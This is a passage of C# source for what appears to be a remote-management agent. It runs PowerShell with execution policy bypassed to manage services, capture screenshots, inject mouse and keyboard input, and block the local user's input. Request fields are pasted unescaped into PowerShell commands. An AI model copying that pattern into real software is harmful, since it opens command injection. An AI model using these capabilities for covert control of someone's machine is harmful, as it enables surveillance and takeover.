                result.Success = false;
                result.Error = "Service restart command timed out after 45 seconds";
                result.ExitCode = -1;
            }
            else
            {
                result.ExitCode = process.ExitCode;
                result.Output = outputBuilder.ToString();
                result.Error = errorBuilder.ToString();
                result.Success = process.ExitCode == 0;
            }
        }
        catch (Exception ex)
        {
            result.Success = false;
            result.Error = $"Failed to restart service: {ex.Message}";
            result.ExitCode = -1;
        }

        return result;
    }

    private async Task<CommandResult> ConfigureServiceAsync(CommandMessage command, CommandResult result)
    {
        try
        {
            var requestData = System.Text.Json.JsonSerializer.Deserialize<ServiceManagementData>(command.Payload);
            
            if (string.IsNullOrEmpty(requestData.ServiceName))
            {
                result.Success = false;
                result.Error = "ServiceName must be specified";
                return result;
            }

            var psCommands = new List<string>();
            
            if (!string.IsNullOrEmpty(requestData.StartType))
            {
                psCommands.Add($"Set-Service -Name '{requestData.ServiceName}' -StartupType {requestData.StartType}");
            }
            
            if (!string.IsNullOrEmpty(requestData.DisplayName))
            {
                psCommands.Add($"Set-Service -Name '{requestData.ServiceName}' -DisplayName '{requestData.DisplayName}'");
            }

            if (psCommands.Count == 0)
            {
                result.Success = false;
                result.Error = "No configuration parameters specified";
                return result;
            }

            var psCommand = string.Join("; ", psCommands) + $"; Write-Output 'Service {requestData.ServiceName} configured successfully'";

            var processInfo = new ProcessStartInfo
            {
                FileName = "powershell.exe",
                Arguments = $"-NoProfile -ExecutionPolicy Bypass -Command \"{EscapePowerShellCommand(psCommand)}\"",
                UseShellExecute = false,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                CreateNoWindow = true,
                WorkingDirectory = Environment.CurrentDirectory
            };

            using var process = new Process { StartInfo = processInfo };
            var outputBuilder = new StringBuilder();
            var errorBuilder = new StringBuilder();

            process.OutputDataReceived += (sender, e) =>
            {
                if (!string.IsNullOrEmpty(e.Data))
                    outputBuilder.AppendLine(e.Data);
            };

            process.ErrorDataReceived += (sender, e) =>
            {
                if (!string.IsNullOrEmpty(e.Data))
                    errorBuilder.AppendLine(e.Data);
            };

            process.Start();
            process.BeginOutputReadLine();
            process.BeginErrorReadLine();

            var completed = await Task.Run(() => process.WaitForExit(30000));
            
            if (!completed)
            {
                process.Kill();
                result.Success = false;
                result.Error = "Service configuration command timed out after 30 seconds";
                result.ExitCode = -1;
            }
            else
            {
                result.ExitCode = process.ExitCode;
                result.Output = outputBuilder.ToString();
                result.Error = errorBuilder.ToString();
                result.Success = process.ExitCode == 0;
            }
        }
        catch (Exception ex)
        {
            result.Success = false;
            result.Error = $"Failed to configure service: {ex.Message}";
            result.ExitCode = -1;
        }

        return result;
    }

    private async Task<CommandResult> GetSystemResourcesAsync(CommandMessage command, CommandResult result)
    {
        try
        {
            var psCommand = @"
$cpu = Get-WmiObject -Class Win32_Processor | Measure-Object -Property LoadPercentage -Average
$memory = Get-WmiObject -Class Win32_OperatingSystem
$disks = Get-WmiObject -Class Win32_LogicalDisk | Where-Object {$_.DriveType -eq 3}
$network = Get-WmiObject -Class Win32_PerfRawData_Tcpip_NetworkInterface | Where-Object {$_.Name -ne 'Loopback' -and $_.Name -notlike '*Isatap*' -and $_.Name -notlike '*Teredo*'}

$resources = @{
    cpu = @{
        usage = $cpu.Average
        cores = (Get-WmiObject -Class Win32_Processor).NumberOfCores
        processes = (Get-Process).Count
        threads = (Get-Process | Measure-Object -Property Threads -Sum).Sum
    }
    memory = @{
        totalPhysical = $memory.TotalVisibleMemorySize * 1024
        availablePhysical = $memory.FreePhysicalMemory * 1024
        usedPhysical = ($memory.TotalVisibleMemorySize - $memory.FreePhysicalMemory) * 1024
        totalVirtual = $memory.TotalVirtualMemorySize * 1024
        availableVirtual = $memory.FreeVirtualMemory * 1024
        usedVirtual = ($memory.TotalVirtualMemorySize - $memory.FreeVirtualMemory) * 1024
        pageFileUsage = ($memory.TotalVirtualMemorySize - $memory.TotalVisibleMemorySize) * 1024
    }
    disk = @{
        drives = @($disks | ForEach-Object {
            @{
                drive = $_.DeviceID
                label = $_.VolumeName
                fileSystem = $_.FileSystem
                totalSize = $_.Size
                freeSpace = $_.FreeSpace
                usedSpace = $_.Size - $_.FreeSpace
                usagePercentage = [math]::Round((($_.Size - $_.FreeSpace) / $_.Size) * 100, 2)
            }
        })
    }
    network = @{
        interfaces = @($network | ForEach-Object {
            @{
                name = $_.Name
                bytesReceived = $_.BytesReceivedPerSec
                bytesSent = $_.BytesSentPerSec
                packetsReceived = $_.PacketsReceivedPerSec
                packetsSent = $_.PacketsSentPerSec
            }
        })
        totalBytesReceived = ($network | Measure-Object -Property BytesReceivedPerSec -Sum).Sum
        totalBytesSent = ($network | Measure-Object -Property BytesSentPerSec -Sum).Sum
    }
    uptime = (Get-WmiObject -Class Win32_OperatingSystem).LastBootUpTime
    timestamp = Get-Date
}

$resources | ConvertTo-Json -Depth 4
";

            var processInfo = new ProcessStartInfo
            {
                FileName = "powershell.exe",
                Arguments = $"-NoProfile -ExecutionPolicy Bypass -Command \"{EscapePowerShellCommand(psCommand)}\"",
                UseShellExecute = false,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                CreateNoWindow = true,
                WorkingDirectory = Environment.CurrentDirectory
            };

            using var process = new Process { StartInfo = processInfo };
            var outputBuilder = new StringBuilder();
            var errorBuilder = new StringBuilder();

            process.OutputDataReceived += (sender, e) =>
            {
                if (!string.IsNullOrEmpty(e.Data))
                    outputBuilder.AppendLine(e.Data);
            };

            process.ErrorDataReceived += (sender, e) =>
            {
                if (!string.IsNullOrEmpty(e.Data))
                    errorBuilder.AppendLine(e.Data);
            };

            process.Start();
            process.BeginOutputReadLine();
            process.BeginErrorReadLine();

            var completed = await Task.Run(() => process.WaitForExit(30000));
            
            if (!completed)
            {
                process.Kill();
                result.Success = false;
                result.Error = "System resources command timed out after 30 seconds";
                result.ExitCode = -1;
            }
            else
            {
                result.ExitCode = process.ExitCode;
                result.Output = outputBuilder.ToString();
                result.Error = errorBuilder.ToString();
                result.Success = process.ExitCode == 0;
            }
        }
        catch (Exception ex)
        {
            result.Success = false;
            result.Error = $"Failed to get system resources: {ex.Message}";
            result.ExitCode = -1;
        }

        return result;
    }

    private class ProcessManagementData
    {
        public int? ProcessId { get; set; }
        public string? ProcessName { get; set; }
    }

    private class ServiceManagementData
    {
        public string ServiceName { get; set; } = "";
        public string? StartType { get; set; }
        public string? DisplayName { get; set; }
        public string? Description { get; set; }
    }

    private async Task<CommandResult> PingAsync(CommandMessage command, CommandResult result)
    {
        result.Output = $"Pong from {Environment.MachineName} at {DateTime.UtcNow:yyyy-MM-dd HH:mm:ss} UTC";
        result.Success = true;
        result.ExitCode = 0;
        return result;
    }

    private async Task<CommandResult> TakeScreenshotAsync(CommandMessage command, CommandResult result)
    {
        try
        {
            var requestData = System.Text.Json.JsonSerializer.Deserialize<ScreenshotRequestData>(command.Payload);
            
            var psCommand = $@"
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$monitors = [System.Windows.Forms.Screen]::AllScreens
$targetMonitor = if ({requestData.MonitorId ?? 0} -lt $monitors.Count) {{ $monitors[{requestData.MonitorId ?? 0}] }} else {{ $monitors[0] }}

$bounds = $targetMonitor.Bounds
$bitmap = New-Object System.Drawing.Bitmap($bounds.Width, $bounds.Height)
$graphics = [System.Drawing.Graphics]::FromImage($bitmap)

try {{
    $graphics.CopyFromScreen($bounds.X, $bounds.Y, 0, 0, $bounds.Size)
    
    # Capture mouse cursor if requested
    if ({requestData.CaptureMouseCursor.ToString().ToLower()}) {{
        $cursorPos = [System.Windows.Forms.Cursor]::Position
        $cursor = [System.Windows.Forms.Cursors]::Default
        $cursorBounds = New-Object System.Drawing.Rectangle($cursorPos.X - $bounds.X, $cursorPos.Y - $bounds.Y, 32, 32)
        if ($cursorBounds.X -ge 0 -and $cursorBounds.Y -ge 0 -and $cursorBounds.X -lt $bounds.Width -and $cursorBounds.Y -lt $bounds.Height) {{
            try {{ $cursor.Draw($graphics, $cursorBounds) }} catch {{ }}
        }}
    }}
    
    # Resize if requested
    $finalBitmap = $bitmap
    if ({requestData.Width ?? 0} -gt 0 -and {requestData.Height ?? 0} -gt 0) {{
        $finalBitmap = New-Object System.Drawing.Bitmap({requestData.Width}, {requestData.Height})
        $resizeGraphics = [System.Drawing.Graphics]::FromImage($finalBitmap)
        $resizeGraphics.DrawImage($bitmap, 0, 0, {requestData.Width}, {requestData.Height})
        $resizeGraphics.Dispose()
        $bitmap.Dispose()
    }}
    
    # Convert to JPEG
    $encoder = [System.Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() | Where-Object {{ $_.MimeType -eq 'image/jpeg' }}
    $encoderParams = New-Object System.Drawing.Imaging.EncoderParameters(1)
    $encoderParams.Param[0] = New-Object System.Drawing.Imaging.EncoderParameter([System.Drawing.Imaging.Encoder]::Quality, {requestData.Quality ?? 75})
    
    $memoryStream = New-Object System.IO.MemoryStream
    $finalBitmap.Save($memoryStream, $encoder, $encoderParams)
    $imageBytes = $memoryStream.ToArray()
    $base64Image = [Convert]::ToBase64String($imageBytes)
    
    $screenshotResult = @{{
        monitorId = {requestData.MonitorId ?? 0}
        width = $finalBitmap.Width
        height = $finalBitmap.Height
        imageData = $base64Image
        size = $imageBytes.Length
        timestamp = (Get-Date).ToString('o')
        capturedMouseCursor = {requestData.CaptureMouseCursor.ToString().ToLower()}
    }}
    
    $screenshotResult | ConvertTo-Json -Compress
    
}} finally {{
    $graphics.Dispose()
    $finalBitmap.Dispose()
    if ($memoryStream) {{ $memoryStream.Dispose() }}
}}
";

            var processInfo = new ProcessStartInfo
            {
                FileName = "powershell.exe",
                Arguments = $"-NoProfile -ExecutionPolicy Bypass -Command \"{EscapePowerShellCommand(psCommand)}\"",
                UseShellExecute = false,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                CreateNoWindow = true,
                WorkingDirectory = Environment.CurrentDirectory
            };

            using var process = new Process { StartInfo = processInfo };
            var outputBuilder = new StringBuilder();
            var errorBuilder = new StringBuilder();

            process.OutputDataReceived += (sender, e) =>
            {
                if (!string.IsNullOrEmpty(e.Data))
                    outputBuilder.AppendLine(e.Data);
            };

            process.ErrorDataReceived += (sender, e) =>
            {
                if (!string.IsNullOrEmpty(e.Data))
                    errorBuilder.AppendLine(e.Data);
            };

            process.Start();
            process.BeginOutputReadLine();
            process.BeginErrorReadLine();

            var completed = await Task.Run(() => process.WaitForExit(30000));
            
            if (!completed)
            {
                process.Kill();
                result.Success = false;
                result.Error = "Screenshot command timed out after 30 seconds";
                result.ExitCode = -1;
            }
            else
            {
                result.ExitCode = process.ExitCode;
                result.Output = outputBuilder.ToString();
                result.Error = errorBuilder.ToString();
                result.Success = process.ExitCode == 0;
            }
        }
        catch (Exception ex)
        {
            result.Success = false;
            result.Error = $"Failed to take screenshot: {ex.Message}";
            result.ExitCode = -1;
        }

        return result;
    }

    private async Task<CommandResult> GetScreenMonitorsAsync(CommandMessage command, CommandResult result)
    {
        try
        {
            var psCommand = @"
Add-Type -AssemblyName System.Windows.Forms

$monitors = [System.Windows.Forms.Screen]::AllScreens
$monitorList = @()

for ($i = 0; $i -lt $monitors.Count; $i++) {
    $monitor = $monitors[$i]
    $monitorInfo = @{
        Id = $i
        Name = ""Monitor $i""
        IsPrimary = $monitor.Primary
        Width = $monitor.Bounds.Width
        Height = $monitor.Bounds.Height
        X = $monitor.Bounds.X
        Y = $monitor.Bounds.Y
        WorkingAreaWidth = $monitor.WorkingArea.Width
        WorkingAreaHeight = $monitor.WorkingArea.Height
        WorkingAreaX = $monitor.WorkingArea.X
        WorkingAreaY = $monitor.WorkingArea.Y
        BitsPerPixel = $monitor.BitsPerPixel
    }
    $monitorList += $monitorInfo
}

$monitorList | ConvertTo-Json -Depth 2
";

            var processInfo = new ProcessStartInfo
            {
                FileName = "powershell.exe",
                Arguments = $"-NoProfile -ExecutionPolicy Bypass -Command \"{EscapePowerShellCommand(psCommand)}\"",
                UseShellExecute = false,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                CreateNoWindow = true,
                WorkingDirectory = Environment.CurrentDirectory
            };

            using var process = new Process { StartInfo = processInfo };
            var outputBuilder = new StringBuilder();
            var errorBuilder = new StringBuilder();

            process.OutputDataReceived += (sender, e) =>
            {
                if (!string.IsNullOrEmpty(e.Data))
                    outputBuilder.AppendLine(e.Data);
            };

            process.ErrorDataReceived += (sender, e) =>
            {
                if (!string.IsNullOrEmpty(e.Data))
                    errorBuilder.AppendLine(e.Data);
            };

            process.Start();
            process.BeginOutputReadLine();
            process.BeginErrorReadLine();

            var completed = await Task.Run(() => process.WaitForExit(15000));
            
            if (!completed)
            {
                process.Kill();
                result.Success = false;
                result.Error = "Monitor list command timed out after 15 seconds";
                result.ExitCode = -1;
            }
            else
            {
                result.ExitCode = process.ExitCode;
                result.Output = outputBuilder.ToString();
                result.Error = errorBuilder.ToString();
                result.Success = process.ExitCode == 0;
            }
        }
        catch (Exception ex)
        {
            result.Success = false;
            result.Error = $"Failed to get monitor list: {ex.Message}";
            result.ExitCode = -1;
        }

        return result;
    }

    private async Task<CommandResult> StartScreenStreamAsync(CommandMessage command, CommandResult result)
    {
        try
        {
            var configData = System.Text.Json.JsonSerializer.Deserialize<ScreenStreamConfigData>(command.Payload);
            
            // For now, just acknowledge the stream start
            // In a full implementation, this would start a background thread for streaming
            result.Success = true;
            result.Output = $"Screen stream started with config: Monitor {configData.MonitorId ?? 0}, Quality {configData.Quality}%, {configData.FrameRate} FPS";
            result.ExitCode = 0;
        }
        catch (Exception ex)
        {
            result.Success = false;
            result.Error = $"Failed to start screen stream: {ex.Message}";
            result.ExitCode = -1;
        }

        return result;
    }

    private async Task<CommandResult> StopScreenStreamAsync(CommandMessage command, CommandResult result)
    {
        try
        {
            // For now, just acknowledge the stream stop
            // In a full implementation, this would stop the background streaming thread
            result.Success = true;
            result.Output = "Screen stream stopped";
            result.ExitCode = 0;
        }
        catch (Exception ex)
        {
            result.Success = false;
            result.Error = $"Failed to stop screen stream: {ex.Message}";
            result.ExitCode = -1;
        }

        return result;
    }

    private async Task<CommandResult> UpdateScreenStreamConfigAsync(CommandMessage command, CommandResult result)
    {
        try
        {
            var configData = System.Text.Json.JsonSerializer.Deserialize<ScreenStreamConfigData>(command.Payload);
            
            // For now, just acknowledge the config update
            // In a full implementation, this would update the streaming configuration
            result.Success = true;
            result.Output = "Screen stream configuration updated";
            result.ExitCode = 0;
        }
        catch (Exception ex)
        {
            result.Success = false;
            result.Error = $"Failed to update screen stream config: {ex.Message}";
            result.ExitCode = -1;
        }

        return result;
    }

    private class ScreenshotRequestData
    {
        public int? MonitorId { get; set; }
        public int? Quality { get; set; } = 75;
        public int? Width { get; set; }
        public int? Height { get; set; }
        public bool CaptureMouseCursor { get; set; } = true;
    }

    private class ScreenStreamConfigData
    {
        public int? MonitorId { get; set; }
        public int Quality { get; set; } = 75;
        public int FrameRate { get; set; } = 5;
        public int? Width { get; set; }
        public int? Height { get; set; }
        public bool CaptureMouseCursor { get; set; } = true;
    }

    private async Task<CommandResult> ProcessMouseClickAsync(CommandMessage command, CommandResult result)
    {
        try
        {
            var mouseData = System.Text.Json.JsonSerializer.Deserialize<MouseClickData>(command.Payload);
            
            // Use Windows API to simulate mouse click
            var psCommand = $@"
Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;

public static class MouseSimulator {{
    [DllImport(""user32.dll"")]
    static extern bool SetCursorPos(int x, int y);
    
    [DllImport(""user32.dll"")]
    static extern void mouse_event(uint dwFlags, uint dx, uint dy, uint dwData, UIntPtr dwExtraInfo);
    
    const uint MOUSEEVENTF_LEFTDOWN = 0x0002;
    const uint MOUSEEVENTF_LEFTUP = 0x0004;
    const uint MOUSEEVENTF_RIGHTDOWN = 0x0008;
    const uint MOUSEEVENTF_RIGHTUP = 0x0010;
    const uint MOUSEEVENTF_MIDDLEDOWN = 0x0020;
    const uint MOUSEEVENTF_MIDDLEUP = 0x0040;
    
    public static void ClickMouse(int x, int y, string button, string action) {{
        SetCursorPos(x, y);
        
        uint downFlag = 0;
        uint upFlag = 0;
        
        switch (button.ToLower()) {{
            case ""left"":
                downFlag = MOUSEEVENTF_LEFTDOWN;
                upFlag = MOUSEEVENTF_LEFTUP;
                break;
            case ""right"":
                downFlag = MOUSEEVENTF_RIGHTDOWN;
                upFlag = MOUSEEVENTF_RIGHTUP;
                break;
            case ""middle"":
                downFlag = MOUSEEVENTF_MIDDLEDOWN;
                upFlag = MOUSEEVENTF_MIDDLEUP;
                break;
        }}
        
        switch (action.ToLower()) {{
            case ""down"":
                mouse_event(downFlag, 0, 0, 0, UIntPtr.Zero);
                break;
            case ""up"":
                mouse_event(upFlag, 0, 0, 0, UIntPtr.Zero);
                break;
            case ""click"":
                mouse_event(downFlag, 0, 0, 0, UIntPtr.Zero);
                System.Threading.Thread.Sleep(50);
                mouse_event(upFlag, 0, 0, 0, UIntPtr.Zero);
                break;
            case ""double_click"":
                mouse_event(downFlag, 0, 0, 0, UIntPtr.Zero);
                mouse_event(upFlag, 0, 0, 0, UIntPtr.Zero);
                System.Threading.Thread.Sleep(50);
                mouse_event(downFlag, 0, 0, 0, UIntPtr.Zero);
                mouse_event(upFlag, 0, 0, 0, UIntPtr.Zero);
                break;
        }}
    }}
}}
'@
[MouseSimulator]::ClickMouse({mouseData.X}, {mouseData.Y}, '{mouseData.Button}', '{mouseData.Action}')
Write-Output 'Mouse {mouseData.Action} executed at ({mouseData.X}, {mouseData.Y}) with {mouseData.Button} button'
";

            var processInfo = new ProcessStartInfo
            {
                FileName = "powershell.exe",
                Arguments = $"-NoProfile -ExecutionPolicy Bypass -Command \"{EscapePowerShellCommand(psCommand)}\"",
                UseShellExecute = false,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                CreateNoWindow = true,
                WorkingDirectory = Environment.CurrentDirectory
            };

            using var process = new Process { StartInfo = processInfo };
            var outputBuilder = new StringBuilder();
            var errorBuilder = new StringBuilder();

            process.OutputDataReceived += (sender, e) =>
            {
                if (!string.IsNullOrEmpty(e.Data))
                    outputBuilder.AppendLine(e.Data);
            };

            process.ErrorDataReceived += (sender, e) =>
            {
                if (!string.IsNullOrEmpty(e.Data))
                    errorBuilder.AppendLine(e.Data);
            };

            process.Start();
            process.BeginOutputReadLine();
            process.BeginErrorReadLine();

            var completed = await Task.Run(() => process.WaitForExit(5000));
            
            if (!completed)
            {
                process.Kill();
                result.Success = false;
                result.Error = "Mouse click command timed out after 5 seconds";
                result.ExitCode = -1;
            }
            else
            {
                result.ExitCode = process.ExitCode;
                result.Output = outputBuilder.ToString();
                result.Error = errorBuilder.ToString();
                result.Success = process.ExitCode == 0;
            }
        }
        catch (Exception ex)
        {
            result.Success = false;
            result.Error = $"Failed to process mouse click: {ex.Message}";
            result.ExitCode = -1;
        }

        return result;
    }

    private async Task<CommandResult> ProcessMouseMoveAsync(CommandMessage command, CommandResult result)
    {
        try
        {
            var mouseData = System.Text.Json.JsonSerializer.Deserialize<MouseMoveData>(command.Payload);
            
            // Use Windows API to simulate mouse move
            var psCommand = $@"
Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;

public static class MouseMover {{
    [DllImport(""user32.dll"")]
    static extern bool SetCursorPos(int x, int y);
    
    public static void MoveMouse(int x, int y) {{
        SetCursorPos(x, y);
    }}
}}
'@
[MouseMover]::MoveMouse({mouseData.X}, {mouseData.Y})
Write-Output 'Mouse moved to ({mouseData.X}, {mouseData.Y})'
";

            var processInfo = new ProcessStartInfo
            {
                FileName = "powershell.exe",
                Arguments = $"-NoProfile -ExecutionPolicy Bypass -Command \"{EscapePowerShellCommand(psCommand)}\"",
                UseShellExecute = false,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                CreateNoWindow = true,
                WorkingDirectory = Environment.CurrentDirectory
            };

            using var process = new Process { StartInfo = processInfo };
            var outputBuilder = new StringBuilder();
            var errorBuilder = new StringBuilder();

            process.OutputDataReceived += (sender, e) =>
            {
                if (!string.IsNullOrEmpty(e.Data))
                    outputBuilder.AppendLine(e.Data);
            };

            process.ErrorDataReceived += (sender, e) =>
            {
                if (!string.IsNullOrEmpty(e.Data))
                    errorBuilder.AppendLine(e.Data);
            };

            process.Start();
            process.BeginOutputReadLine();
            process.BeginErrorReadLine();

            var completed = await Task.Run(() => process.WaitForExit(3000));
            
            if (!completed)
            {
                process.Kill();
                result.Success = false;
                result.Error = "Mouse move command timed out after 3 seconds";
                result.ExitCode = -1;
            }
            else
            {
                result.ExitCode = process.ExitCode;
                result.Output = outputBuilder.ToString();
                result.Error = errorBuilder.ToString();
                result.Success = process.ExitCode == 0;
            }
        }
        catch (Exception ex)
        {
            result.Success = false;
            result.Error = $"Failed to process mouse move: {ex.Message}";
            result.ExitCode = -1;
        }

        return result;
    }

    private async Task<CommandResult> ProcessKeyboardInputAsync(CommandMessage command, CommandResult result)
    {
        try
        {
            var keyData = System.Text.Json.JsonSerializer.Deserialize<KeyboardInputData>(command.Payload);
            
            // Use Windows API to simulate keyboard input
            var psCommand = $@"
Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;
using System.Windows.Forms;

public static class KeyboardSimulator {{
    [DllImport(""user32.dll"")]
    static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);
    
    const uint KEYEVENTF_KEYDOWN = 0x0000;
    const uint KEYEVENTF_KEYUP = 0x0002;
    
    public static void SendKey(string key, string action, bool ctrl, bool alt, bool shift, bool win) {{
        // Handle modifier keys
        if (ctrl) keybd_event(0x11, 0, KEYEVENTF_KEYDOWN, UIntPtr.Zero); // VK_CONTROL
        if (alt) keybd_event(0x12, 0, KEYEVENTF_KEYDOWN, UIntPtr.Zero);  // VK_MENU
        if (shift) keybd_event(0x10, 0, KEYEVENTF_KEYDOWN, UIntPtr.Zero); // VK_SHIFT
        if (win) keybd_event(0x5B, 0, KEYEVENTF_KEYDOWN, UIntPtr.Zero);   // VK_LWIN
        
        byte vkCode = GetVirtualKeyCode(key);
        
        switch (action.ToLower()) {{
            case ""down"":
                keybd_event(vkCode, 0, KEYEVENTF_KEYDOWN, UIntPtr.Zero);
                break;
            case ""up"":
                keybd_event(vkCode, 0, KEYEVENTF_KEYUP, UIntPtr.Zero);
                break;
            case ""press"":
                keybd_event(vkCode, 0, KEYEVENTF_KEYDOWN, UIntPtr.Zero);
                System.Threading.Thread.Sleep(50);
                keybd_event(vkCode, 0, KEYEVENTF_KEYUP, UIntPtr.Zero);
                break;
        }}
        
        // Release modifier keys
        if (win) keybd_event(0x5B, 0, KEYEVENTF_KEYUP, UIntPtr.Zero);
        if (shift) keybd_event(0x10, 0, KEYEVENTF_KEYUP, UIntPtr.Zero);
        if (alt) keybd_event(0x12, 0, KEYEVENTF_KEYUP, UIntPtr.Zero);
        if (ctrl) keybd_event(0x11, 0, KEYEVENTF_KEYUP, UIntPtr.Zero);
    }}
    
    static byte GetVirtualKeyCode(string key) {{
        switch (key.ToUpper()) {{
            case ""ENTER"": return 0x0D;
            case ""ESCAPE"": return 0x1B;
            case ""SPACE"": return 0x20;
            case ""TAB"": return 0x09;
            case ""BACKSPACE"": return 0x08;
            case ""DELETE"": return 0x2E;
            case ""HOME"": return 0x24;
            case ""END"": return 0x23;
            case ""PAGEUP"": return 0x21;
            case ""PAGEDOWN"": return 0x22;
            case ""ARROWLEFT"": return 0x25;
            case ""ARROWUP"": return 0x26;
            case ""ARROWRIGHT"": return 0x27;
            case ""ARROWDOWN"": return 0x28;
            case ""F1"": return 0x70;
            case ""F2"": return 0x71;
            case ""F3"": return 0x72;
            case ""F4"": return 0x73;
            case ""F5"": return 0x74;
            case ""F6"": return 0x75;
            case ""F7"": return 0x76;
            case ""F8"": return 0x77;
            case ""F9"": return 0x78;
            case ""F10"": return 0x79;
            case ""F11"": return 0x7A;
            case ""F12"": return 0x7B;
            default:
                if (key.Length == 1) {{
                    char c = key.ToUpper()[0];
                    if (c >= 'A' && c <= 'Z') return (byte)c;
                    if (c >= '0' && c <= '9') return (byte)c;
                }}
                return 0x41; // Default to 'A'
        }}
    }}
}}
'@
[KeyboardSimulator]::SendKey('{keyData.Key}', '{keyData.Action}', ${keyData.Modifiers?.Ctrl?.ToString().ToLower() ?? "false"}, ${keyData.Modifiers?.Alt?.ToString().ToLower() ?? "false"}, ${keyData.Modifiers?.Shift?.ToString().ToLower() ?? "false"}, ${keyData.Modifiers?.Win?.ToString().ToLower() ?? "false"})
Write-Output 'Keyboard {keyData.Action} executed for key: {keyData.Key}'
";

            var processInfo = new ProcessStartInfo
            {
                FileName = "powershell.exe",
                Arguments = $"-NoProfile -ExecutionPolicy Bypass -Command \"{EscapePowerShellCommand(psCommand)}\"",
                UseShellExecute = false,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                CreateNoWindow = true,
                WorkingDirectory = Environment.CurrentDirectory
            };

            using var process = new Process { StartInfo = processInfo };
            var outputBuilder = new StringBuilder();
            var errorBuilder = new StringBuilder();

            process.OutputDataReceived += (sender, e) =>
            {
                if (!string.IsNullOrEmpty(e.Data))
                    outputBuilder.AppendLine(e.Data);
            };

            process.ErrorDataReceived += (sender, e) =>
            {
                if (!string.IsNullOrEmpty(e.Data))
                    errorBuilder.AppendLine(e.Data);
            };

            process.Start();
            process.BeginOutputReadLine();
            process.BeginErrorReadLine();

            var completed = await Task.Run(() => process.WaitForExit(5000));
            
            if (!completed)
            {
                process.Kill();
                result.Success = false;
                result.Error = "Keyboard input command timed out after 5 seconds";
                result.ExitCode = -1;
            }
            else
            {
                result.ExitCode = process.ExitCode;
                result.Output = outputBuilder.ToString();
                result.Error = errorBuilder.ToString();
                result.Success = process.ExitCode == 0;
            }
        }
        catch (Exception ex)
        {
            result.Success = false;
            result.Error = $"Failed to process keyboard input: {ex.Message}";
            result.ExitCode = -1;
        }

        return result;
    }

    private async Task<CommandResult> DisableLocalInputAsync(CommandMessage command, CommandResult result)
    {
        try
        {
            // Use Windows API to block local input
            var psCommand = @"
Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;

public static class InputBlocker {
    [DllImport(""user32.dll"")]
    static extern bool BlockInput(bool fBlockIt);
    
    public static bool DisableInput() {
        return BlockInput(true);
    }
    
    public static bool EnableInput() {
        return BlockInput(false);
    }
}
'@
$result = [InputBlocker]::DisableInput()
if ($result) {
    Write-Output 'Local input disabled successfully'
} else {
    Write-Error 'Failed to disable local input - may require administrator privileges'
}
";

            var processInfo = new ProcessStartInfo
            {
                FileName = "powershell.exe",
                Arguments = $"-NoProfile -ExecutionPolicy Bypass -Command \"{EscapePowerShellCommand(psCommand)}\"",
                UseShellExecute = false,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                CreateNoWindow = true,
                WorkingDirectory = Environment.CurrentDirectory
            };

            using var process = new Process { StartInfo = processInfo };
            var outputBuilder = new StringBuilder();
            var errorBuilder = new StringBuilder();

            process.OutputDataReceived += (sender, e) =>
            {
                if (!string.IsNullOrEmpty(e.Data))
                    outputBuilder.AppendLine(e.Data);
            };

            process.ErrorDataReceived += (sender, e) =>
            {
                if (!string.IsNullOrEmpty(e.Data))
                    errorBuilder.AppendLine(e.Data);
            };

            process.Start();
            process.BeginOutputReadLine();
            process.BeginErrorReadLine();

            var completed = await Task.Run(() => process.WaitForExit(10000));
            
            if (!completed)
            {
                process.Kill();
                result.Success = false;
                result.Error = "Disable input command timed out after 10 seconds";
                result.ExitCode = -1;
            }
            else
            {
                result.ExitCode = process.ExitCode;
                result.Output = outputBuilder.ToString();
                result.Error = errorBuilder.ToString();
                result.Success = process.ExitCode == 0;
            }
        }
        catch (Exception ex)
        {
            result.Success = false;
            result.Error = $"Failed to disable local input: {ex.Message}";
            result.ExitCode = -1;
        }

        return result;
    }

    private async Task<CommandResult> EnableLocalInputAsync(CommandMessage command, CommandResult result)
    {
        try
        {
            // Use Windows API to unblock local input
            var psCommand = @"
Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;

public static class InputBlocker {
    [DllImport(""user32.dll"")]
    static extern bool BlockInput(bool fBlockIt);
    
    public static bool EnableInput() {
        return BlockInput(false);
    }
}
'@
$result = [InputBlocker]::EnableInput()
if ($result) {
    Write-Output 'Local input enabled successfully'
} else {
    Write-Error 'Failed to enable local input'
}
";

            var processInfo = new ProcessStartInfo
            {
                FileName = "powershell.exe",
                Arguments = $"-NoProfile -ExecutionPolicy Bypass -Command \"{EscapePowerShellCommand(psCommand)}\"",
                UseShellExecute = false,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                CreateNoWindow = true,
                WorkingDirectory = Environment.CurrentDirectory
            };

            using var process = new Process { StartInfo = processInfo };
            var outputBuilder = new StringBuilder();
            var errorBuilder = new StringBuilder();

            process.OutputDataReceived += (sender, e) =>
            {
                if (!string.IsNullOrEmpty(e.Data))
                    outputBuilder.AppendLine(e.Data);
            };

            process.ErrorDataReceived += (sender, e) =>
            {
                if (!string.IsNullOrEmpty(e.Data))
                    errorBuilder.AppendLine(e.Data);
            };

            process.Start();
            process.BeginOutputReadLine();
            process.BeginErrorReadLine();

            var completed = await Task.Run(() => process.WaitForExit(10000));
            
            if (!completed)
            {
                process.Kill();
                result.Success = false;
                result.Error = "Enable input command timed out after 10 seconds";
                result.ExitCode = -1;
            }
            else
            {
                result.ExitCode = process.ExitCode;
                result.Output = outputBuilder.ToString();
                result.Error = errorBuilder.ToString();
                result.Success = process.ExitCode == 0;
            }
        }
        catch (Exception ex)
        {
            result.Success = false;
            result.Error = $"Failed to enable local input: {ex.Message}";
            result.ExitCode = -1;
        }

        return result;
    }

    private class MouseClickData
    {
        public int X { get; set; }
        public int Y { get; set; }
        public string Button { get; set; } = "left";
        public string Action { get; set; } = "click";
        public int? MonitorId { get; set; }
